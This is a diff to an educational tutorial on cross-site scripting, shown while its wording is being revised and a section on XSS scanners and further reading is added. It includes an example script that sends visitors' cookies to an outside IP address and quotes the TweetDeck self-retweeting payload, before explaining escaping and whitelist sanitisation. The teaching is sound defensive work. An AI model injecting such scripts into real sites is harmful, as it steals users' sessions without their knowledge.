@@ -31,7 +31,7 @@ Here is the comments section of the website:
 That's a very nice picture! <br>
 Good photograph!
 
-However, are users limited to just typing in plain text? This website does not check the input, thus users are able to use formatting HTML tags, such
+However, are users limited to just typing in text? This website does not check the input, thus users are able to use formatting HTML tags, such
 as `<b>` for bolding and `<i>` for italicizing.
 
 What happens when a user submits the following as a comment?
@@ -45,8 +45,9 @@ That's a very nice picture! <br>
 Good photograph! <br>
 I **like** your photograph!
 
-The problem arises when a malicious user uses HTML for malicious purposes. HTML also supports `<script>`, for you to write JavaScript code on the webpage as well.
-> In HTML, anything between `<script>` and `</script>` will be run as Javascript.
+HTML also supports `<script>`, for you to write JavaScript code on the webpage as well. 
+
+*In HTML, anything between `<script>` and `</script>` will be run as `JavaScript`.*
 
 What happens when a malicious user submits the following as a comment?
 ```html
@@ -60,7 +61,9 @@ Good photograph! <br>
 I **like** your photograph! <br>
 This is an innocent looking comment.
 
-Visitors of the blog will only see the non-script portion of the comment. The script portion is rendered as `Javascript` just like how the `<b>` and `<i>` tags causes text to be **bolded** and *italicised* but the tags themselves are not shown. The script `<script>sendToServer("http://139.241.0.3/", document.cookie)</script>` will be run immediately when the visitors load the website. Here, the visitor will be unaware that his cookie is actually stolen. 
+Visitors of the blog will only see the non-script portion of the comment. The script portion is rendered as `Javascript` just like how the `<b>` and `<i>` tags causes text to be **bolded** and *italicised* but the tags themselves are not shown. 
+
+The script `<script>sendToServer("http://139.241.0.3/", document.cookie)</script>` will be run immediately when the visitors load the website. Here, the visitor will be unaware that his cookie is stolen. 
 
 Therefore, the malicious user has managed to add additional "functionalities" to the website that is not intended by the original website developer.
 
@@ -111,7 +114,7 @@ alert('XSS in Tweetdeck')
 </script> ♥
 ```
 
-The first line selects the retweet button and then clicks it, and the second line confirms the action by clicking ok on the modal tht confirms the retweet. Recall that if a Tweetdeck user saw this tweet back then he will only see "♥", the script contents will not be seen. 
+The first line selects the retweet button and then clicks it, and the second line confirms the action by clicking ok on the modal tht confirms the retweet. A TweetDeck user who saw this tweet will only see "♥", the script portion is executed by the browser on the script. Thus, without the `alert()`, the TweetDeck user will not even notice anything.
 
 You can still see this tweet <a href="https://twitter.com/dergeruhn/status/476764918763749376?lang=en" target="_blank">here</a>.
 
@@ -132,12 +135,28 @@ Good photograph! <br>
 I **like** your photograph! <br>
 This is an innocent looking comment. `<script>sendToServer("http://139.241.0.3/", document.cookie)</script>`
 
-The `<script>` and `</script>` will be displayed as text rather than being run as Javascript by the browser.
+The `<script>` and `</script>` will be displayed as text rather than being run as `JavaScript` by the browser.
 
 **Whitelist Sanitization** <br>
 By scanning and parsing the input as HTML, you can
 remove undesired HTML elements, and only allowing certain whitelisted HTML
 elements to be used (e.g. whitelisting only `<b>` and `<i>`).
+
+You can also consider using XSS scanning tools to check whether your web application is vulnerable. Below are links of some open-source XSS scanning tools: 
+
+1. http://wapiti.sourceforge.net/ (Web Application Vulnerability Scanner)
+1. http://w3af.org/ (Web Application Attack and Audit Framework)
+1. https://www.arachni-scanner.com/ (Web Application Security Scanner Framework)
+
+## Where to go from here?
+
+Although XSS is the most common web application vulnerability, there are also many other vulnerabilities. It is important to be aware of the other vulnerabilities to properly secure your web application. Here is a statistical 
+<a href="https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Web-application-attacks-2018-eng.pdf" target="_blank">report</a> on web application vulnerabilities and a graphical summary retrieved from it: 
+
+![Graphical Statistic](./Images/StatisticGraphic.png)
+
+You can learn about SQL Injection [here](../sqlInjection.html) and Cross Site Request Forgery 
+[here](../crossSiteRequestForgery/crossSiteRequestForgery.html).
 
 ## Resources
 
@@ -154,7 +173,7 @@ References:
 Additional Reading Resources:
 
 1. https://www.owasp.org/index.php/Testing_for_Cross_site_scripting
-(How to test your website for XSS attacks)
+(How to manually test your own website for XSS attacks?)
 1. https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet
 (A list of possible preventions, which contains even more ways to protect your site from XSS attacks).
 1. http://guides.rubyonrails.org/security.html#cross-site-scripting-xss
